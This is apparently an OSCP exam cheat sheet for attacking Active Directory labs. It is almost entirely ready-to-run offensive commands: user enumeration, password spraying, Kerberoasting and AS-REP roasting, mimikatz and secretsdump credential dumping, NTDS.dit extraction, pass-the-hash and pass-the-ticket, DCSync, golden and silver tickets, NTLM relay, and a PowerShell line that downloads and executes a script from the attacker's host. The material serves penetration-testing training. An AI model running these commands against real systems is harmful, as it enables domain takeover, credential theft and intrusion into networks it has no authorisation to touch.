
---

## Part 1 – Enumeration (MS01)

### 1. Get User List

| Tool / Method              | Command                                                                             |
| -------------------------- | ----------------------------------------------------------------------------------- |
| **Kerbrute** (user enum)   | `kerbrute userenum --dc <DC_IP> -d <domain> userlist.txt`                           |
| **enum4linux**             | `enum4linux -U <target_IP>`                                                         |
| **rpcclient**              | `rpcclient -U "" -N <target_IP>` → `enumdomusers`                                   |
| **nxc smb**                | `nxc smb <target_IP> -u '' -p '' --users`                                           |
| **ldapsearch** (anonymous) | `ldapsearch -x -H ldap://<DC_IP> -b "DC=<domain>,DC=<tld>" "(&(objectClass=user))"` |

### 2. Identify Valid User

| Tool                      | Command                                                                     |
| ------------------------- | --------------------------------------------------------------------------- |
| **Kerbrute**              | `kerbrute userenum --dc <DC_IP> -d <domain> userlist.txt` (checks pre‑auth) |
| **Kerbrute** (brute user) | `kerbrute bruteuser --dc <DC_IP> -d <domain> passwords.txt username`        |
|                           |                                                                             |

### 3. Enumerate SMB Shares

| Scenario | Command |
|-----------|---------|
| Null session | `nxc smb <target_IP> -u '' -p '' --shares` |
| Guest login | `nxc smb <target_IP> -u 'guest' -p '' --shares` |
| With credentials | `nxc smb <target_IP> -u <user> -p <pass> --shares` |
| List files on share | `smbclient //<target_IP>/<share> -U <user> -c "ls"` |
| Upload file (smbclient) | `smbclient //<target_IP>/<share> -U <user> -c "put localfile remotefile"` |

### 4. Password Spray

| Protocol | Command (nxc) |
|----------|----------------|
| SMB | `nxc smb <target_IP> -u users.txt -p <password> --continue-on-success` |
| WinRM | `nxc winrm <target_IP> -u users.txt -p <password> --continue-on-success` |
| RDP | `nxc rdp <target_IP> -u users.txt -p <password> --continue-on-success` |
| SSH | `nxc ssh <target_IP> -u users.txt -p <password> --continue-on-success` |

### 5. AS‑REP Roasting

| Tool | Command |
|-------|---------|
| **impacket-GetNPUsers** | `impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -format john -outputfile asreproast.hash` |
| **John the Ripper** | `john --wordlist=/usr/share/wordlists/rockyou.txt --rules asreproast.hash` |

### 6. Kerberoasting

| Tool | Command |
|-------|---------|
| **impacket-GetUserSPNs** | `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerberoast.hash` |
| **John the Ripper** | `john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash` |
| **nxc ldap** (kerberoast) | `nxc ldap <DC_IP> -u <user> -p <pass> --kerberoasting output.txt` |

### 7. BloodHound

| Tool | Command |
|-------|---------|
| **SharpHound** (Windows) | `SharpHound.exe -c All --domain <domain> --ldapuser <user> --ldappass <pass>` |
| **BloodHound.py** (Kali) | `bloodhound-python -d <domain> -u <user> -p <pass> -ns <DC_IP> -c All` |
| **nxc ldap** (BloodHound) | `nxc ldap <DC_IP> -u <user> -p <pass> --bloodhound --collection All --dns-server <DC_IP>` |

**Key edges to look for:**
- `GenericAll`, `AllExtendedRights`, `ForceChangePassword`, `WriteProperty`
- `MemberOf` → `Domain Admins`, `Account Operators`, `IT`, `Backup Operators`
- `CanRDP` (outbound)

### 8. Credential Dump (after local admin on a machine)

| Tool | Command |
|-------|---------|
| **impacket-secretsdump** (Kali) | `impacket-secretsdump <domain>/<user>@<target_IP>` |
| **mimikatz** (Windows) | `privilege::debug` → `sekurlsa::logonpasswords` |
| **hashcat** (NTLM) | `hashcat -m 1000 hash.ntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` |

### 9. PowerView (Windows)

```powershell
# Load PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain

# Users
Get-DomainUser | select samaccountname

# Groups
Get-DomainGroupMember "Domain Admins"

# Local admin access on machines
Find-LocalAdminAccess

# Interesting ACLs
Find-InterestingDomainAcl
```

---

## Part 2 – Local Privilege Escalation (MS01)

### 1. Credential Harvesting (filesystem)

| Source | Manual Check (Windows) |
|--------|------------------------|
| Browser creds | Check `%APPDATA%\..\Local\Google\Chrome\User Data\Default\Login Data` |
| Config files | `findstr /si "password" *.config *.ini *.xml *.txt` |
| Saved RDP creds | `cmdkey /list` (then `mimikatz` `ts::multirdp`) |
| Scheduled tasks | `schtasks /query /fo LIST /v` |
| Scripts | `dir /s *cred* *pass* *user* *.ps1 *.bat *.vbs` |

### 2. Token Impersonation (Se*Privileges)

| Privilege | Exploitation |
|-----------|--------------|
| **SeImpersonatePrivilege** | Use `PrintSpoofer`, `JuicyPotato`, `GodPotato` (Windows) |
| **SeBackupPrivilege** | Use `reg save` + `secretsdump` or `diskshadow` |
| **SeRestorePrivilege** | Replace system files (e.g., utilman.exe) |
| **SeManageVolumePrivilege** | Similar to backup – read/write any file |

**Check current privileges:** `whoami /priv`

### 3. Windows Local Privilege Escalation

| Vulnerability                                      | Check Method                                                               | Exploit                                        |
| -------------------------------------------------- | -------------------------------------------------------------------------- | ---------------------------------------------- |
| Unquoted service path                              | `wmic service get name,displayname,pathname,startmode`                     | Create malicious binary in writable path       |
| Service binary replacement                         | `icacls <service_path>`                                                    | Replace binary if writable                     |
| Writable service config                            | `sc qc <service>`                                                          | `sc config <service> binpath="cmd.exe /c ..."` |
| DLL hijacking                                      | ProcMon → look for NAME NOT FOUND                                          | Place malicious DLL in writable directory      |
| Scheduled tasks                                    | `schtasks /query /fo LIST /v`                                              | Modify task action                             |
| Insecure file permissions (Program Files, Startup) | `icacls "C:\Program Files\*"` (if writable)                                | Overwrite executable                           |
| UAC bypass                                         | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | Use `eventvwr`, `fodhelper`, `cmstp` (Windows) |

> **(X)** in original – not always available, but keep in mind.

---

## Part 3 – Lateral Movement (Service Account → MS02)

### 1. Movement Channels

| Protocol             | Command (from Kali)                                         |
| -------------------- | ----------------------------------------------------------- |
| **WinRM**            | `evil-winrm -i <target> -u <user> -p <pass>` or `nxc winrm` |
| **SMB / PsExec**     | `impacket-psexec <domain>/<user>@<target>`                  |
| **WMI**              | `impacket-wmiexec <domain>/<user>@<target>`                 |
| **DCOM**             | `impacket-dcomexec <domain>/<user>@<target>`                |
| **SSH** (if enabled) | `ssh <user>@<target>`                                       |

### 2. Password Spray (with found credentials)

```bash
nxc smb <target_IP> -u users.txt -p <plaintext_password> --continue-on-success
```

### 3. Shadow Copies (VSS)

| Step | Command (Windows) |
|------|-------------------|
| Create shadow copy | `vssadmin create shadow /for=C:` |
| Copy SAM/SYSTEM | `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM .` |
| Extract hashes | `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` |

### 4. Pass the Hash (PtH)

| Tool | Command |
|-------|---------|
| **nxc smb** | `nxc smb <target> -u <user> -H <ntlm_hash> -x "whoami"` |
| **impacket-psexec** | `impacket-psexec -hashes :<ntlm_hash> <domain>/<user>@<target>` |
| **evil-winrm** | `evil-winrm -i <target> -u <user> -H <ntlm_hash>` |

### 5. Pass the Ticket (PtT)

| Tool | Command (Windows) |
|-------|-------------------|
| Load ticket (mimikatz) | `kerberos::ptt <ticket.kirbi>` |
| List tickets | `klist` |
| Use ticket with PSExec | `.\PsExec.exe \\<target> cmd` (will use Kerberos) |

### 6. Over Pass the Hash

```bash
# Convert NTLM to AES keys or use plaintext to request TGT
impacket-getTGT <domain>/<user> -hashes :<ntlm_hash> -dc-ip <DC_IP>
# Then set KRB5CCNAME and use any impacket tool with -k
export KRB5CCNAME=<user>.ccache
impacket-psexec -k <domain>/<user>@<target>
```

### 7. DCOM Lateral Movement

```powershell
# Windows (admin PowerShell)
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc","7")
```

### 8. ACL Abuse

| Right | Attack |
|-------|--------|
| **GenericAll** on user | Reset password: `net user <user> <newpass> /domain` (Windows) or `impacket-smbpasswd` |
| **GenericWrite** | Write `servicePrincipalName` → Kerberoast |
| **WriteOwner / WriteDACL** | Grant DCSync rights → `impacket-secretsdump` |

### 9. MSSQL Attacks

| Action | Command (Windows) |
|--------|-------------------|
| Enumerate DB records | `SELECT * FROM table` |
| Enable `xp_cmdshell` | `EXEC sp_configure 'show advanced options',1; reconfigure; EXEC sp_configure 'xp_cmdshell',1; reconfigure;` |
| Execute commands | `EXEC xp_cmdshell 'whoami'` |
| Impersonate (SeImpersonatePrivilege) | Use `JuicyPotato` on SQL service |

### 10. Net‑NTLMv2 (SMB) – (X) but useful

```bash
# Capture with responder
sudo responder -I eth0 -wdv

# Relay with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## Part 4 – DC Compromised (DC01)

### 1. Credential Harvesting on DC

| Source | Command |
|--------|---------|
| NTDS.dit | `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL` |
| LSA secrets | `reg save HKLM\SECURITY SECURITY` (then secretsdump) |

### 2. SAM / SYSTEM

```bash
# From DC (Windows)
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

# On Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 3. GPO (Group Policy Objects)

| Action | Command |
|--------|---------|
| List GPOs (Windows) | `Get-GPO -All` (PowerShell GroupPolicy module) |
| Find cpasswords | `findstr /S /I cpassword \\<DC>\SYSVOL\<domain>\Policies\*.xml` |
| Decrypt cpassword | `gpp-decrypt <encrypted_password>` |

### 4. Silver / Golden Ticket

| Ticket | Command (mimikatz) |
|--------|---------------------|
| **Golden** (krbtgt hash) | `kerberos::golden /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /user:Administrator /ticket:golden.kirbi` |
| **Silver** (service NTLM) | `kerberos::golden /domain:<domain> /sid:<domain_sid> /target:<service_FQDN> /service:<service> /rc4:<service_hash> /user:anyuser /ptt` |

### 5. DCSync Attack

```bash
# Using mimikatz (Windows)
mimikatz "lsadump::dcsync /domain:<domain> /user:krbtgt"

# Using impacket (Kali)
impacket-secretsdump -just-dc <domain>/<user_with_replication_rights>@<DC_IP>

# Grant DCSync rights via ACL (if WriteDACL)
impacket-dacledit -action write -rights DCSync -target-dn "DC=..." -principal <user> <domain>/<admin>@<DC_IP>
```

### 6. GPP / cPassword Attacks

```bash
# Search SYSVOL for Groups.xml, ScheduledTasks.xml, Services.xml, Printers.xml
nxc smb <DC_IP> -u <user> -p <pass> -M gpp_autologin
# Manual:
smbclient //<DC_IP>/SYSVOL -U <user> -c "recurse; ls" | grep -i ".xml"
```

### 7. ADCS Attacks – (X) but note

| Attack | Condition |
|--------|------------|
| ESC1 | Enroll with any SAN |
| ESC3 | Agent templates |
| ESC8 | Web enrolment endpoint |

### 8. Un/Constrained Delegation – (X)

```bash
# Find delegation
bloodhound-python -d <domain> -u <user> -p <pass> -ns <DC_IP> -c Delegation
# Constrained: use s4u2proxy
impacket-getST -spn <service> -impersonate Administrator <domain>/<user> -hashes :<hash>
```

### 9. RBCD (Resource Based Constrained Delegation) – (X)

```bash
# Add delegation (requires Write access on target)
impacket-rbcd -delegate-from <controlled_computer> -delegate-to <target> -action write <domain>/<user>@<DC>
# Then get S4U2self ticket
```

### 10. GMSA (Group Managed Service Accounts)

```bash
# Retrieve GMSA password (if allowed)
nxc ldap <DC> -u <user> -p <pass> -M gmsa
# Or impacket:
impacket-gMSAPassword -d <domain> -u <user> -p <pass> -dc-ip <DC>
```

---

## General OSCP AD Checklist & Commands

### Initial Access / Footprinting

```bash
# Full Nmap scan (all ports)
sudo nmap -p- -T4 -Pn <IP> -oA fullscan
# Service scan on open ports
sudo nmap -sV -sC -p <ports> <IP> -oA services

# Check null/guest SMB shares
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --shares

# RDP to MS01
xfreerdp3 /v:<IP> /u:'offsec' /p:'lab' /cert:ignore /dynamic-resolution /drive:linux,/opt/ +clipboard

# WinRM
evil-winrm -i <IP> -u '<user>' -p '<password>'
evil-winrm -i <IP> -u '<user>' -H <ntlm_hash>
```

### Privilege Escalation on a Compromised Windows Box

```powershell
# Quick manual checks
dir C:\
tree /F /A C:\Users\
whoami /all

# Automated tools (upload and run)
# PrivEscCheck (PowerShell)
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<kali>/PrivEscCheck.ps1'); Invoke-PrivescCheck"

# WinPEAS (exe)
winPEASx64.exe
```

### Post‑Exploitation (Once Admin)

#### Mimikatz (Windows)

```cmd
.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" exit
```

#### Impacket Secretsdump (Kali)

```bash
impacket-secretsdump '<domain>/<user>'@<target_IP>
```

#### LaZagne (Windows)

```cmd
.\lazagne.exe all
```

#### If Credentials Found

- Try all protocols: **WinRM, RDP, MSSQL, SMB** (with `--local-auth` if needed)
- Set up **Ligolo** pivoting to reach MS02 and DC01

#### If No Credentials Found

- Pivot and enumerate MS02 / DC01 shares & BloodHound
- Search filesystem for suspicious files:

```powershell
findstr /spin /c:"password" /c:"credential" /c:"secret" *.*
Get-ChildItem -Recurse -Include *.config,*.ini,*.xml,*.txt,*.ps1 | Select-String "password"
```

### Useful nxc (NetExec) One‑Liners

```bash
# AS-REP roast
nxc ldap <DC_IP> -u <user> -p <pass> --asreproast asreproast.out

# Kerberoast
nxc ldap <DC_IP> -u <user> -p <pass> --kerberoasting output.txt

# Export domain users
nxc smb <DC_IP> -u <user> -p <pass> --users-export users

# RID brute
nxc smb <DC_IP> -u <user> -p <pass> --rid-brute | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users

# BloodHound via nxc
nxc ldap <DC_IP> -u <user> -p <pass> --bloodhound --collection All --dns-server <DC_IP>
```

### On MS02 (Second Machine)

```cmd
# Check local administrators
net localgroup Administrators
```

Same enumeration / privilege escalation / post‑exploitation steps apply.

---

## Final Notes

- **BloodHound** is your best friend – always run it early.
- **Always check for AS-REP roastable and Kerberoastable users** after getting any valid credentials.
- **Pivot** with Ligolo, Chisel, or SSH tunnels when you reach a machine with multiple interfaces.
- **Keep notes** of credentials and hashes in a structured way (e.g., `creds.txt`).

Good luck in your OSCP exam!